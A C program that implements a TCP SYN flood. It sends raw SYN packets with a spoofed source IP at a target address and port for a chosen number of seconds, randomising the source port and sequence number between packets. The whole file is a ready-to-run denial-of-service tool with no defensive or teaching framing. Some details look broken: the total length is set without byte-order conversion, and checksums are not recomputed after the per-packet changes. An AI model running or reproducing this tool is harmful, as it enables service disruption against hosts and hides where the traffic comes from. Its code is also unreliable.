#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define PACKET_LEN 4096

unsigned short csum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while(len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if(len == 1) {
        sum += *(unsigned char*)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void flood(const char *target_ip, int target_port, int duration) {
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0) {
        perror("socket");
        exit(1);
    }

    char packet[PACKET_LEN];
    struct iphdr *iph = (struct iphdr*)packet;
    struct tcphdr *tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &dest.sin_addr);

    memset(packet, 0, PACKET_LEN);
    
    // IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(rand());
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("1.2.3.4"); // Spoofed source IP
    iph->daddr = dest.sin_addr.s_addr;
    
    // TCP header
    tcph->source = htons(rand() % 65535);
    tcph->dest = htons(target_port);
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;
    
    // Calculate checksums
    iph->check = csum((unsigned short*)packet, iph->tot_len);
    
    struct pseudo_header {
        unsigned int source_address;
        unsigned int dest_address;
        unsigned char placeholder;
        unsigned char protocol;
        unsigned short tcp_length;
        struct tcphdr tcp;
    } psh;
    
    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));
    
    tcph->check = csum((unsigned short*)&psh, sizeof(struct pseudo_header));
    
    time_t start = time(NULL);
    int packet_count = 0;
    
    printf("Flooding %s:%d for %d seconds...\n", target_ip, target_port, duration);
    
    while(time(NULL) - start < duration) {
        if(sendto(s, packet, iph->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest)) < 0) {
            perror("sendto");
            break;
        }
        packet_count++;
        
        // Randomize source port and sequence for each packet
        tcph->source = htons(rand() % 65535);
        tcph->seq = rand();
    }
    
    close(s);
    printf("Sent %d packets\n", packet_count);
}

int main(int argc, char *argv[]) {
    if(argc != 4) {
        printf("Usage: %s <IP> <PORT> <DURATION_SECONDS>\n", argv[0]);
        return 1;
    }
    
    srand(time(NULL));
    flood(argv[1], atoi(argv[2]), atoi(argv[3]));
    return 0;
}
